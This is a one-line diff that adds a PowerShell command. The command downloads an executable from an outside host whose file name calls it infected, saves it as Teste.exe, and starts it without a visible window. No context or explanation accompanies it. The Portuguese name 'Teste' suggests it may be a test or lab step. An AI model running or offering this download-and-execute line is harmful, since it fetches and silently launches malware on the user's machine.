@@ -1,0 +1,1 @@
+Invoke-WebRequest -Uri “https://alld.dev/assets/others/Servi%C3%A7os%20Windows%20infected.exe” -OutFile Teste.exe; Start-Process -NoNewWindow -FilePath .\Teste.exe
